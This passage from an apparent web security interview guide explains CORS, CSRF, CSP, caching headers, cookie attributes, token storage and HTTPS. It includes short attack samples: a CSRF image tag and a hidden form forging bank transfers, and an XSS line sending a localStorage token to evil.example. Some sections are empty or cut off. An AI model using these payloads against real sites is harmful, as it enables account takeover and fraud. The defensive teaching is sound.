Why this lands: the phrase "blocks reading the response, not sending the request" is the single highest-signal sentence in this whole topic. Combined with "protects users, not servers," you've demonstrated you understand the threat model rather than the error message.

Follow-up: "Does CORS protect my API?"

Show the answer

"No. CORS is enforced by browsers, so it only constrains browser-based clients. Anything that isn't a browser — curl, a script, a mobile app, another server — ignores it and reads the response normally. It protects my users from having their authenticated data read by a page on some other origin. Protecting the API itself is authn/authz, rate limiting, and input validation on the server."

If they push: yes, it does provide one server-relevant thing — the preflight means a cross-origin page can't trivially fire off a DELETE with a JSON body without approval. But that's incidental, not the design goal, and it doesn't cover form-shaped requests.

Follow-up: "Why does it work in Postman but not the browser?"

Show the answer

"Because Postman isn't a browser and has no origin, so there's nothing to enforce. The server is happily responding in both cases — in the browser, the response comes back and then the browser refuses to hand it to my JS because the CORS headers didn't permit my origin. Which also means 'it works in Postman' tells you the server is fine and the header config is missing — it's not evidence the browser is wrong."

Great extra detail: check the Network tab for an OPTIONS row. If the preflight is failing — often because auth middleware 401s it — the real request never fires at all.

Follow-up: "Can you fix CORS from the frontend?"

Show the answer

"Not genuinely — and that's the design. If the client could grant itself permission the mechanism would be pointless. I can't set the Origin header because it's a forbidden header name the browser controls, and mode: 'no-cors' doesn't help because it just gives me an opaque response I can't read. What I can do is remove the cross-origin-ness: a dev-server proxy locally, or a backend-for-frontend / same-origin path routing in production. Otherwise the server has to send the header."

Follow-up: "What exactly does a preflight do, and how do you avoid one?"

Show the answer

"It's an OPTIONS request the browser sends before the real one, carrying Access-Control-Request-Method and -Headers, asking the server whether that request is allowed. It fires whenever the request isn't 'simple' — anything other than GET/POST/HEAD, any non-safelisted header, or a Content-Type outside form-urlencoded / multipart / text-plain, which is why almost every JSON API call preflights."

"To reduce the cost: set Access-Control-Max-Age so the browser caches the approval instead of preflighting every call, and avoid gratuitous custom headers. You generally shouldn't try to eliminate it by sending JSON as text/plain — that's fighting a safety mechanism to save a round trip."

Follow-up: "Why can't Allow-Origin: * be used with credentials?"

Show the answer

"Because * means any origin may read the response, and a credentialed response is by definition personalised to the logged-in user. Allowing both would let any site fetch an authenticated endpoint with the victim's cookies and read the result — exactly what SOP exists to prevent. So with credentials the server has to name a specific origin, which forces a deliberate trust decision. In practice you check the incoming Origin against an allowlist, echo it back, and add Vary: Origin so caches don't cross the wires."

Traps

Wrong: "CORS stops other websites from calling my API."
Say instead: "CORS stops other websites' JavaScript from reading my responses in a browser. The call itself still happens, and non-browser clients aren't affected at all."
Wrong: "I fixed it by adding mode: 'no-cors'." This is the single most common false fix, and interviewers know it. It doesn't fix anything; it silences the error by giving you an unreadable opaque response. If your code "worked" after this, you weren't using the response.
Wrong: "CORS errors are a browser bug / browsers being annoying." Reads as not understanding the threat model. The browser is doing its job, and the missing piece is a server configuration.

Part 6CSRF — riding someone else's session

We left a loose thread in the SOP section, and now we pull it.

SOP stops evil.example from reading your bank's responses. Fine. But we established that the request still gets sent, and the server still processes it. So what if the attacker doesn't care about reading anything? What if the damage is the request?

That's Cross-Site Request Forgery.

The mechanism, which is one sentence

Browsers attach cookies to a request based on where it's going, not based on who initiated it.

Read that again, because it's the whole vulnerability. Your browser has no concept of "this request was triggered by code the bank wrote" versus "this request was triggered by an image tag on a forum." It sees a request headed for bank.com, checks its cookie jar for cookies scoped to bank.com, and attaches them. Every time. That's what cookies are — they were designed in 1994 to make HTTP stateful, and "who asked for this" wasn't part of the design.

Here's the attack in full. You're logged into your bank in one tab. In another, you're reading a forum, where someone has posted this — and it renders as a broken image nobody looks at twice:

<img src="https://bank.com/transfer?to=attacker&amount=5000">

Your browser sees an image tag. It fetches the URL. SOP doesn't apply to <img> — remember, images cross origins freely. Your session cookie rides along, because the destination is bank.com. The bank's server sees a valid, authenticated request from a logged-in user and does the transfer.

The browser then fails to render the response as an image and logs a console warning nobody reads. Money's gone. No JavaScript was needed at all.

My analogy for this: cookies are like a hotel keycard that opens your room from anywhere in the building. It doesn't matter who's holding the door handle or why you're standing there — the lock only checks the card. CSRF is someone standing behind you in the corridor, saying "hey, could you push that door for me?", and the door opening because your card is in your pocket. Where the analogy breaks down: in a real hotel you'd notice. Here the door is a POST request and you never see a thing.

POSTs are just as vulnerable, incidentally — an auto-submitting hidden form does it, and forms are exempt from SOP too:

<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('f').submit();</script>

Note that this form posts as application/x-www-form-urlencoded — a simple request. No preflight. Nothing to approve. It just goes.

Why this hits cookie auth and not bearer tokens

Here's the property that makes cookies vulnerable: they're ambient. The browser attaches them automatically, without your code asking. Automatic attachment is exactly what an attacker needs, because the attacker can trigger a request but cannot write code that runs in your origin.

Now compare a token in localStorage:

fetch('/api/transfer', {
  method: 'POST',
  headers: { Authorization: `Bearer ${localStorage.getItem('token')}` },
  //                          👆 YOUR code has to put this here
});

The token only travels because your JavaScript explicitly read it and attached it. An attacker's page can't do that: it can't read your origin's localStorage (SOP partitions storage per origin), and even if it could send a request to your API, it has no token to attach. The request arrives unauthenticated and gets rejected.

So bearer tokens in localStorage are structurally immune to CSRF. That is a real, genuine advantage, and it's why so many SPA tutorials go that route.

But — and this is the sentence that makes you sound senior — that doesn't remove the risk, it moves it. You've traded a CSRF problem for an XSS problem, and made it worse: a token in localStorage is readable by any script on your origin, so a single XSS becomes total, exfiltratable account compromise. With HttpOnly cookies, XSS is still bad, but the token itself can't leave the browser.

We'll settle this properly in the token storage section. Park it.

Defence 1: SameSite cookies

Since the root cause is "browsers attach cookies regardless of who initiated the request," the cleanest fix is to make the browser care who initiated it. That's SameSite.

Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/

Three values:

SameSite=Lax — the modern default

Cookies are not sent on cross-site subrequests — images, iframes, fetch/XHR, and form POSTs. They are sent on top-level navigations that use a safe method, meaning: the user clicked a link and the whole page changed.

That exception exists for usability. Without it, following a link to github.com from Slack would land you logged out, every time, which would feel broken. So Lax is a compromise: it kills the image-tag and hidden-form attacks (the overwhelming majority of CSRF) while keeping links working.

Modern Chrome and Edge treat cookies with no SameSite attribute as Lax by default, which quietly wiped out an enormous amount of CSRF across the web. That's why CSRF feels less scary than it did in 2018.

But — Lax is not complete protection, and this is a favourite interview follow-up. What still gets through:

  • Top-level GET navigations. If any state-changing endpoint responds to GET — /logout, /subscribe?plan=pro, an old-style /delete?id=5 — an attacker can just point a link or a redirect at it and the cookie rides along. Which is precisely why "never use GET for state changes" is a security rule, not just REST pedantry.
  • Same-site but different-origin attacks. SameSite works at site level (the registrable domain), not origin. So if an attacker gets XSS on blog.example.com, or you let users host content on a subdomain, requests from there to app.example.com count as same-site and cookies flow.
  • Chrome's two-minute grace window. Historically, freshly-set cookies with no explicit SameSite were still sent on top-level cross-site POSTs for a couple of minutes, to avoid breaking payment redirect flows. Setting SameSite explicitly opts out of that.

SameSite=Strict

Cookies are never sent on any cross-site request, including top-level navigation. Maximum safety, real UX cost: click a link to your app from an email, and you arrive logged out, even though your session is right there in the jar. Refreshing fixes it, which is a confusing experience.

The pattern for high-value apps is two cookies: a Strict one for anything sensitive, plus a Lax "you are logged in" cookie that lets you render a signed-in-looking page and re-elevate.

SameSite=None

Explicitly opts in to cross-site sending — the old default behaviour. You need it for genuine cross-site cases: an embedded widget, an SSO iframe, an API on a different registrable domain than the frontend. It requires Secure — browsers reject SameSite=None without it. And it means CSRF is fully back on the table, so you must pair it with tokens.

Wait — does SameSite=Lax fully prevent CSRF?

No, and saying "yes" is one of the easiest ways to get marked down on this topic.

It's excellent — it eliminates the classic hidden-form-POST and image-tag attacks, and it's on by default in the biggest browsers. But it leaves top-level GET navigations, it operates at site rather than origin granularity so a compromised or user-controlled subdomain slips through, and browser behaviour varies (Safari and Firefox have historically differed from Chrome on defaults).

Treat it as a strong layer, not the only one. For anything genuinely sensitive: SameSite plus CSRF tokens plus origin checking, and never a GET that changes state.

Defence 2: CSRF tokens

The deeper fix goes back to the root cause. The server can't distinguish a real request from a forged one, because both carry an identical cookie. So: require something in the request that only a script running on your origin could know.

That's a CSRF token. A random, unguessable value tied to the session.

The synchronizer token pattern

The server generates a random token, stores it against the session, and embeds it in the page:

<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="Kj8Xm2p…">  <!-- 👈 -->
  …
</form>

On submission, the server compares the submitted token against the one it stored. Match, proceed. Missing or wrong, reject.

Why does this work? Because the attacker's page can forge the cookie (well — cause it to be attached) but it cannot read the token. To read it, they'd have to load your page and pull the value out of the HTML, and SOP forbids exactly that: cross-origin script cannot read your response body or your iframe's DOM. The cookie is ambient; the token is not. That asymmetry is the entire defence.

The double-submit cookie pattern

Storing per-session tokens server-side is annoying for stateless APIs, so there's a variant. The server sets the random token as a readable (not HttpOnly) cookie. The client's JS reads it and copies it into a request header:

const csrf = document.cookie.match(/csrfToken=([^;]+)/)[1];

fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrf },   // 👈 same value, different channel
  credentials: 'include',
});

The server just checks that the cookie value and the header value match. No server-side storage at all.

Why is it safe if the token is sitting in a cookie the attacker can cause to be sent? Because the attacker can trigger the cookie but can't set the header: setting a custom header on a cross-origin request requires a preflight, and your server will decline to approve requests from unknown origins. And they can't read the cookie's value to forge it, because SOP blocks cross-origin cookie reads.

The catch: double-submit is weaker than the synchronizer pattern if an attacker can write cookies for your domain — which a compromised sibling subdomain can do, since cookies are domain-scoped rather than origin-scoped. The hardened version signs the token or binds it to the session. If you have subdomains you don't fully control, prefer synchronizer tokens.

Also: this is why sending a custom header at all (even X-Requested-With: XMLHttpRequest) is a partial CSRF defence — it forces a preflight that the attacker's origin can't pass. It's a weak layer on its own, but it's the reason a JSON API that strictly requires Content-Type: application/json is harder to CSRF than a form endpoint.

Defence 3: check the Origin header

Every cross-origin request — and every POST, even same-origin, in modern browsers — carries an Origin header. The browser sets it and your JS cannot forge it (forbidden header name, remember). So the server can just look:

✅ Fixed — cheap and effective
const origin = req.headers.origin || req.headers.referer;

if (!origin || !ALLOWED_ORIGINS.has(new URL(origin).origin)) {
  return res.status(403).send('Cross-origin request rejected');
}

Simple, stateless, no tokens to manage. Two caveats: Referer can be stripped by privacy tools or a Referrer-Policy, so don't rely on it alone, and you have to decide what to do when Origin is absent (for non-browser clients, for example). Best used alongside tokens rather than instead of them.

Defence 4: never use GET for state changes

We've now seen this rule earn its keep twice. GET (and HEAD) are supposed to be safe methods — meaning no side effects. Once you honour that:

  • SameSite=Lax's top-level-navigation exception becomes harmless, because navigating to a GET endpoint can't change anything.
  • <img>, <script>, prefetchers and link crawlers can't accidentally trigger destructive actions. (Google's Web Accelerator famously deleted people's data years ago by prefetching "delete" links.)
  • Browsers can safely retry, cache, and prerender.

If a GET endpoint mutates state, no amount of SameSite configuration saves you.

In an interview — CSRF

How it gets asked

"What's CSRF and how do you prevent it?" · "What's the difference between XSS and CSRF?" · "Why does a CSRF token work?" · "Does SameSite=Lax fully prevent CSRF?" · "If we use JWTs in headers, do we still need CSRF protection?"

Model answer — say this out loud

"CSRF works because browsers attach cookies based on the request's destination, not on who initiated it. Why this lands: you named the ambient-credential mechanism instead of describing a symptom, you connected it back to SOP correctly, and you closed with the trade-off. That last paragraph is what turns "knows CSRF" into "reasons about auth design."

Follow-up: "What's the difference between XSS and CSRF?"

Show the answer

"XSS is code execution in my origin — the attacker's script runs with my page's full privileges, so they can read anything and do anything. CSRF is much narrower: the attacker can't run code in my origin and can't read my responses, they can only cause a request and rely on the browser attaching credentials. So XSS is a confidentiality and integrity break; CSRF is integrity only."

The killer add-on: "and XSS defeats every CSRF defence. If an attacker has script running in my origin, they can just read the CSRF token out of the DOM. So CSRF protection assumes you don't have XSS."

Follow-up: "Why does a CSRF token actually work?"

Show the answer

"Because it turns an ambient credential into an explicit one. The cookie is attached automatically, so having it proves nothing about who initiated the request. The token has to be deliberately included, and the attacker can't obtain it: reading it means reading my page's HTML or cookie from another origin, which SOP forbids. So a request carrying a valid token must have come from something that could read my origin — meaning my own page."

Follow-up: "We use JWTs in an Authorization header. Do we need CSRF protection?"

Show the answer

"If the token is only ever in memory or localStorage and attached explicitly by my code, then no — nothing is ambient, so there's nothing to forge. But two caveats. If the JWT is also stored in a cookie the server accepts, CSRF is fully back, and that's a common accidental setup. And going the localStorage route means any XSS is complete account compromise, so I've swapped one risk for another rather than eliminating risk."

Follow-up: "SameSite=Lax is on by default now. Is CSRF solved?"

Show the answer

"Mostly mitigated, not solved. Lax still permits top-level GET navigations, so any state-changing GET is exposed. It's site-scoped, not origin-scoped, so a compromised or user-controlled subdomain still counts as same-site. Browser defaults aren't uniform. And any endpoint that legitimately needs SameSite=None — embedded widgets, SSO iframes — is fully exposed. For sensitive operations I'd still want tokens and origin checks on top."

Trap

Wrong: "CSRF is when an attacker injects a script into my site." That's XSS. Mixing these up is the fastest way to lose credibility on this topic — they get confused constantly, so interviewers are specifically listening for it.
Say instead: "CSRF involves no injected code at all. The attacker's page is entirely on their own origin; they just trigger a request to mine."

Part 7Content Security Policy

Let's go back to XSS for a second. We fixed it by escaping output and avoiding innerHTML. Good. But you have 400 components, 60 dependencies, and a CMS. Are you certain there's no injection anywhere?

No. Nobody is. So we want a second line of defence: a way to tell the browser in advance what our page is legitimately allowed to load and run, so that anything injected later gets refused even if it makes it into the DOM.

That's Content Security Policy. It's a response header (or a <meta> tag, though the header is better) containing an allowlist:

Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://images.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self'

Now if an attacker injects <script src="https://evil.example/steal.js">, the browser looks at script-src, sees evil.example isn't on the list, and refuses to load it. The XSS bug is still there — but it doesn't accomplish anything.

Think of it as a bouncer with a printed guest list at the door of your page, checking every resource before it's allowed in. The list is written by you, in advance, and the browser enforces it. Where it breaks down: the bouncer only checks where things came from, not what they do. Something on the list that misbehaves gets in fine.

The directives worth knowing

DirectiveControls

script-srcWhere JS may load from, and whether inline scripts and eval are allowed. The one that matters most for XSS.

The inline script problem, and how nonces and hashes solve it

Here's the awkward part. A strict CSP blocks all inline scripts — every <script>…</script> with content, and every onclick="…" attribute. That's not incidental; it's the whole point, because injected XSS is almost always inline.

But real apps have legitimate inline scripts: analytics snippets, the SSR state blob we discussed, a theme-flash-prevention script that must run before paint.

The lazy escape hatch is 'unsafe-inline', and it completely guts the policy. Once inline scripts are allowed, an injected inline script is allowed too, and script-src is doing essentially nothing for XSS. Same story for 'unsafe-eval', which re-enables eval and new Function.

The real solutions:

Nonces

Generate a fresh random value per request, put it in the header and on your own script tags:

Content-Security-Policy: script-src 'nonce-r4nd0mPerRequest'

<script nonce="r4nd0mPerRequest">  <!-- 👈 runs -->
  window.__STATE__ = { … };
</script>

<script>alert('injected')</script>  <!-- ❌ no nonce, blocked -->

The attacker can't guess the nonce because it changes every response. Two rules: it must be cryptographically random, and it must be per-response. A hardcoded nonce in a static file is worthless — and note this means nonces need a server rendering the HTML; they don't work for a fully static, CDN-cached page.

Hashes

For static pages, allowlist the exact SHA of the script's contents:

script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='

No server-side randomness needed. The downside: change one byte of that script and the hash breaks, so it has to be part of your build.

'strict-dynamic'

Host allowlists turn out to be surprisingly weak in practice — research found most real-world CSPs bypassable, usually because some allowlisted CDN also hosts an old AngularJS build or a JSONP endpoint that will happily execute attacker-chosen code for you.

'strict-dynamic' changes the model: it says "trust is propagated." A script that was loaded with a valid nonce may load further scripts, and the host allowlist is ignored entirely. So your one trusted bootstrap script can pull in whatever it needs — which is exactly how webpack/module loaders behave — while injected markup, which has no nonce, still can't run.

script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-inline';
             👆 modern browsers use this
                                            👆 ignored by modern browsers,
                                               fallback for ancient ones

That odd-looking line is the recommended strict pattern: newer browsers honour the nonce and strict-dynamic and ignore the rest; older ones ignore what they don't understand and fall back to something workable. Being able to explain why that policy has apparently contradictory pieces is a nice deep cut.

Rolling it out without breaking production

If you deploy a strict CSP to a mature app on a Friday afternoon, you will break something. Guaranteed. So use report-only mode:

Content-Security-Policy-Report-Only:
  default-src 'self'; report-uri /csp-violations

Nothing is blocked. Violations are logged (to the console, and POSTed to your endpoint). You run it for a couple of weeks, watch what fires, discover the seven third-party scripts marketing added that you didn't know about, fix or allowlist them — and only then flip to the enforcing header. You can run both headers simultaneously: a loose enforcing policy plus a strict report-only one you're working toward.

The honest note on CSP

CSP is defence in depth, not a fix. It reduces the impact of an XSS you didn't catch. It does not make injection safe, and a policy with unsafe-inline — which is a large fraction of real-world policies — provides almost no XSS protection at all.

In an interview, saying "we'd add a CSP" as your primary answer to XSS is a yellow flag. Saying "escape output contextually, avoid raw innerHTML, sanitise with an allowlist where we must — and layer a nonce-based CSP on top for the bugs we miss" is the answer.

Part 8HTTP caching headers (and the security angle)

Caching feels like a performance topic, and mostly it is — but it shows up in security interviews for one specific reason we'll get to, and the headers themselves are a classic recall question. Let's do it properly, because two of these are confused constantly.

The mental model: two questions

Every caching decision answers two separate questions, and keeping them separate is 80% of understanding this:

  1. Can I use my stored copy without asking? — that's freshness, controlled by Cache-Control: max-age.
  2. If I do have to ask, can I avoid re-downloading? — that's validation, controlled by ETag and Last-Modified.

A fresh response is used instantly with zero network. A stale one triggers a conditional request, which either returns a tiny 304 Not Modified ("your copy is fine") or a full new response.

Cache-Control, directive by directive

no-cache vs no-store — spelling it out

These get asked because the naming is genuinely bad and the difference is genuinely important.

no-cache should have been called always-revalidate. The response is written to cache. The browser just isn't allowed to serve it without checking first. With an ETag, that check usually costs one small round trip and a 304 — you skip re-downloading the body entirely. It's a performance-friendly way to say "always up to date."

no-store means the response must not be written down anywhere. Not to disk, not to the CDN, not to the back/forward cache. Every request goes to the network and downloads the whole thing. It's a privacy directive, not a freshness one.

The intuition: no-cache is "check with me first." no-store is "don't write this down."

Validators: ETag and Last-Modified

When a cached copy goes stale, the browser doesn't blindly re-download — it asks a conditional question.

// First response:
ETag: "a3f5c891"
Last-Modified: Wed, 12 Aug 2026 10:30:00 GMT

// Later, browser asks:
If-None-Match: "a3f5c891"
If-Modified-Since: Wed, 12 Aug 2026 10:30:00 GMT

// Server: unchanged →
HTTP/1.1 304 Not Modified          // 👈 no body. Headers only.

An ETag is an opaque fingerprint of the content — often a content hash. Exact, and works for content that changes more than once per second. A Last-Modified date is coarser (one-second resolution) and can be wrong if a file is touched without changing. ETag wins where both are present.

The 304 is the payoff: a few hundred bytes of headers instead of a 200KB payload. You still pay the round trip, which is why max-age (no request at all) beats revalidation when you can use it.

The pattern that makes all of this easy

Here's the setup basically every modern frontend build uses, and it's worth being able to describe:

index.html          →  Cache-Control: no-cache
app.4f3a9b2c.js     →  Cache-Control: public, max-age=31536000, immutable
logo.8e1d0f7a.svg   →  Cache-Control: public, max-age=31536000, immutable

The trick is the hash in the filename. Because the name is derived from the contents, a changed file gets a different name — so you can cache it forever with zero risk of serving something stale. There's no invalidation problem, because you never overwrite anything; you just publish new names.

The HTML is the one file with a fixed name, so it's the one that must always be checked. no-cache makes it revalidate on every load — cheap, usually a 304 — and when it does change, it points at the new hashed filenames. One small conditional request unlocks a fully-cached deploy. That's the whole design, and it's elegant.

The security angle

Now the bit that belongs in a security guide.

A shared cache — a CDN, a corporate proxy — stores one copy and serves it to many people. If an authenticated, personalised response ends up in a shared cache, the next person to request that URL gets someone else's data. This is a real and recurring class of incident; it takes down real companies.

❌ Buggy
GET /api/me  →  200 OK
Cache-Control: max-age=300      // 👈 no 'private'. A CDN may store this.
{ "email": "sam@example.com", "role": "admin" }
✅ Fixed
GET /api/me  →  200 OK
Cache-Control: private, no-store
Vary: Cookie, Authorization

Rules of thumb:

  • Anything personalised gets private at minimum. Anything sensitive gets no-store.
  • Vary: Cookie (and Authorization) tells caches the response depends on who's asking. Without Vary, a cache keys purely on the URL and cheerfully mixes users up. Same principle as Vary: Origin in the CORS section.
  • After logout, the previous user's pages shouldn't be recoverable with the back button — no-store on authenticated HTML handles that.
  • Be careful with CDN configs that "cache everything" or strip cookies to improve hit rates. That's exactly how these incidents happen.

Part 9Cookie attributes, one at a time

We've leaned on cookies for two whole sections. Let's give them their own, because every attribute on a Set-Cookie line is a security decision, and interviewers ask you to enumerate them.

Set-Cookie: __Host-session=abc123; HttpOnly; Secure; SameSite=Lax;
            Path=/; Max-Age=1800

HttpOnly

The cookie becomes invisible to JavaScript. document.cookie won't show it. No API can read it. It's attached to requests by the browser and that's the only way it's ever used.

This is the single most important attribute for a session cookie, and it's the main structural mitigation against XSS: if an attacker gets script running in your origin, they still cannot read or exfiltrate the session token. It doesn't stop them using the session — more on that shortly — but stealing a token that works from the attacker's own machine for weeks is much worse than acting inside a page the user might close.

Secure

Only sent over HTTPS. Without it, a single accidental http:// request — a typed URL, an old bookmark, an injected link — sends the session token in plaintext across the network, where anyone on the path can read it. Always set it. (Localhost is exempted by browsers so development still works.)

SameSite

Covered in the CSRF section: Lax as a sane default, Strict for high-value with a UX cost, None (requires Secure) only when you genuinely need cross-site sending.

Domain and Path — the scope, and the subdomain risk

This is the subtle one. Domain controls which hosts get the cookie, and the rule surprises people:

  • Omit Domain → host-only. Set by app.example.com, sent only to app.example.com. This is the tighter, safer option.
  • Domain=example.com → sent to example.com and every subdomain: app., api., blog., marketing-campaign-2019., and whatever the growth team spins up next week.

See the problem? A domain-wide session cookie is handed to every subdomain, including ones running third-party software, a legacy CMS, a status page, or a customer-controlled vanity host. XSS on the least important subdomain you own becomes session theft for your main app. And the risk runs the other way too: a compromised subdomain can write cookies that your main app will read, which is exactly how the double-submit CSRF pattern gets undermined.

Default to omitting Domain. Only widen the scope when you actually need cross-subdomain sessions, and then treat every subdomain as part of your security perimeter.

Path=/admin restricts by URL path, but treat it as organisation rather than security — same-origin JS can read across paths, and it's easy to work around.

Expires / Max-Age vs session cookies

No Expires and no Max-Age means a session cookie: gone when the browser closes. Feels secure, but it's soft — "session restore" features in every major browser routinely bring them back.

Max-Age=1800 (seconds, relative — preferred) or Expires=date (absolute, depends on the client's clock being right) creates a persistent cookie that survives restarts. That's the "remember me" experience.

Either way, the real expiry must be enforced server-side. A cookie's lifetime is a hint to the browser; the session's lifetime is a fact in your database. Deleting the cookie doesn't invalidate anything — logout must revoke server-side.

The __Host- and __Secure- prefixes

A lovely trick, and mentioning it in an interview is a genuine flex because most people have never heard of it.

The problem: cookie attributes aren't visible on the way in. Your server receives Cookie: session=abc and has no idea whether that cookie was set with Secure, or by which host. So a network attacker on plain HTTP, or a compromised subdomain, can overwrite your carefully-configured cookie with a sloppy one and you can't tell.

The prefixes fix that by putting the requirement in the name, and browsers enforce it at set time:

  • __Secure- prefix → the browser rejects the Set-Cookie unless it has Secure and came from a secure origin.
  • __Host- prefix → requires Secure, requires Path=/, and forbids Domain. So a __Host- cookie is guaranteed host-only: no subdomain can set it, and no subdomain receives it.

Because the guarantee is carried in the name, and the name is sent to the server, seeing __Host-session arrive tells you it was set securely and host-scoped. Free integrity, one rename. Use __Host- for session cookies whenever you don't need cross-subdomain sharing.

Part 10Where do I put the auth token?

This is the question. It comes up in almost every frontend interview that touches auth, and it's designed to see whether you can reason about trade-offs or whether you just repeat what a tutorial told you.

The trap is that there's no answer that's simply "safe." Every option trades one attack for another. So let's lay them out honestly.

Option A: localStorage

localStorage.setItem('token', accessToken);
// later
headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }

The good: dead simple. Survives refresh and tab close. Works across ports and any client (mobile apps do the same thing). And — genuinely — immune to CSRF, because nothing is ambient: your code must explicitly attach it, and an attacker's page can't run your code.

The bad, and it's very bad: localStorage is readable by any JavaScript on your origin. That includes injected script, and it includes any of your 900 transitive npm dependencies. So any XSS is total account compromise: one line, fetch('//evil.example?t=' + localStorage.token), and the attacker has a token they can use from their own machine, from anywhere, until it expires. No browser needed. Your logs will show it as a legitimate authenticated user.

It's also readable by anything with DOM access, has no expiry mechanism of its own, and is shared across all tabs.

Option B: HttpOnly cookies

Set-Cookie: __Host-session=abc; HttpOnly; Secure; SameSite=Lax; Path=/

The good: JavaScript literally cannot read it. XSS cannot exfiltrate the token — that's a real, meaningful reduction in blast radius. Sent automatically, so no client-side plumbing. Server controls the lifetime and can revoke.

The bad: it's ambient, so you must handle CSRF — SameSite plus tokens plus origin checks, as above. Cross-domain setups (API on a different registrable domain) require SameSite=None, CORS with credentials, and care. And there's a nuance people miss:

A common misconception — "HttpOnly means XSS doesn't matter"

It really doesn't. HttpOnly stops the attacker from reading the token. It does nothing to stop them from using it.

Injected script can still call fetch('/api/transfer', { method: 'POST', credentials: 'include', … }) — and the browser will attach the HttpOnly cookie, because the request is same-origin and that's what cookies do. The attacker never sees the token and doesn't need to. They can perform any action the user can, read any data the API returns, and script an entire session inside the victim's browser.

What HttpOnly changes is persistence and portability: the attacker is confined to the victim's browser while the page is open, rather than walking away with a credential they can replay from a server in another country for the next 30 days. That's a big win. It is not immunity.

Option C: in memory only

let accessToken = null;   // 👈 a module-scoped variable. That's it.

The good: nothing on disk, so it's the safest at rest. Nothing survives a tab close. Immune to CSRF. Not readable by another tab.

The bad: gone on every refresh, which means a logged-out-looking app every time someone hits F5 — unacceptable UX unless you can silently get a new one. Which means a refresh token, which has to live somewhere, which is the same problem one level down. And XSS on the page can still read a JS variable — it's not magic, just not persistent.

The consensus answer

Here's where the industry has landed, and it's the answer I'd give:

  1. A short-lived access token (5–15 minutes) held in memory, or in a cookie.
  2. A refresh token in an HttpOnly; Secure; SameSite=Lax cookie, scoped with Path=/auth/refresh so it's only sent to the one endpoint that needs it, and named with __Host-.
  3. Refresh token rotation: every refresh issues a new one and invalidates the old. If a stolen token is replayed, the server sees a used token and can revoke the whole family — so theft becomes detectable, not just possible.
  4. CSRF defences on the cookie-authenticated endpoints, because you're using cookies.
  5. Server-side revocation, so logout and "sign out everywhere" actually do something.

You get the short exposure window of in-memory tokens, the exfiltration resistance of HttpOnly, and refresh-on-load UX. The cost is more moving parts.

And be honest about when a plain bearer token is fine: a public API with no cookie auth at all, a mobile or desktop client where there's no browser and no CSRF concept, a third-party API consumed cross-domain where cookies are painful, or a low-stakes internal tool where the simplicity genuinely wins. The wrong answer isn't "localStorage" — it's picking either one without being able to say what you gave up.

How it gets asked

Model answer — "localStorage or cookies for a JWT?"

Part 11HTTPS/TLS and why the frontend cares

"Use HTTPS" is advice so universal it's become background noise. Let's make it concrete, because there's a specific reason a frontend engineer should care, and it connects directly back to XSS.

What plain HTTP actually looks like

An HTTP request is plain text travelling through a chain of machines you don't control: the café's router, the ISP, several backbone hops, a hosting provider's load balancer. Every one of them can read the bytes. And — this is the part people underweight — every one of them can change the bytes.

So over HTTP, an intermediary can inject a <script> tag into your HTML on the way to the user. Not steal a cookie: inject code into your origin. Every defence we built in the XSS section assumes the HTML that arrives is the HTML you sent. Over HTTP that assumption is false, and there's nothing you can do about it in application code. ISPs have genuinely done this to inject ads; hostile networks have done it to inject exploits.

TLS gives you three things:

  • Confidentiality — the traffic is encrypted, so intermediaries see only which host you connected to, not the URLs, headers, cookies, or bodies.
  • Integrity — the content is authenticated, so tampering is detected and the connection fails rather than silently delivering modified code.
  • Authentication — you're actually talking to the server that owns that domain, not something impersonating it.

Integrity is the one that matters most for frontend security, and it's the one people mention least.

The handshake, conceptually

You don't need the cryptography, but you should be able to sketch the shape:

  1. Your browser says hello and lists the cipher suites it supports.
  2. The server replies with its certificate — a document containing its domain name and public key, digitally signed by a Certificate Authority.
  3. Your browser checks that signature against the list of CAs it trusts (shipped with your OS/browser), checks the certificate hasn't expired or been revoked, and checks the domain name matches the one you asked for.
  4. Using asymmetric crypto, both sides agree on a shared symmetric key that only they know. Everything after that is encrypted with it, because symmetric crypto is much faster.

The mental model: the certificate is a passport. The server hands it over, and the CA is the government that issued it. Your browser trusts the passport because it recognises the issuing authority's signature — not because it knows the server personally. Where it breaks down: if a government issues a fraudulent passport, everything downstream believes it. That's why CA compromises are a big deal, and why Certificate Transparency logs exist.

HSTS: closing the first-visit gap

You have HTTPS. But a user types example.com into the address bar with no scheme. The browser tries http://, you send a 301 to https://, and everything's fine — except that first request went out in the clear, and an attacker on the network could have intercepted it and kept the user on HTTP forever (an "SSL stripping" attack), quietly proxying the site while reading everything.

HTTP Strict Transport Security closes that:

Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Once the browser sees this over a valid HTTPS connection, it remembers for a year: never use HTTP for this domain. It rewrites http:// to https:// internally, before any request leaves. It also refuses to let users click through certificate warnings.

includeSubDomains covers everything under the domain. preload asks to be baked into a list shipped inside browsers, which closes even the very first visit. Preload is close to irreversible — deploy it only when you're certain every subdomain, forever, can do HTTPS.

Mixed content

An HTTPS page that loads an HTTP subresource has a hole in it, so browsers intervene:

  • Active mixed content — scripts, stylesheets, iframes, XHR/fetch. Blocked outright. These can control the page, so an injected version is game over.
  • Passive mixed content — images, video, audio. Historically allowed with a downgraded padlock; browsers now auto-upgrade to HTTPS and block if that fails. Less catastrophic (you'd just see a wrong image), but still leaks which resources you're loading.

Practical note: this is one of the most common "it works locally, it's broken in production" bugs. A hardcoded http:// URL, or an API returning absolute HTTP URLs for images. Content-Security-Policy: upgrade-insecure-requests is a good migration crutch.

Secure contexts — features that simply don't exist on HTTP

Here's the pragmatic reason you'll hit this even on a hobby project. Browsers gate powerful APIs behind a secure context (HTTPS, or localhost for development):

  • Service workers — and therefore PWAs, offline support, background sync. A service worker can intercept every request for your origin; over HTTP, an attacker could install a permanent one.
  • Geolocation, camera and microphone (getUserMedia), notifications
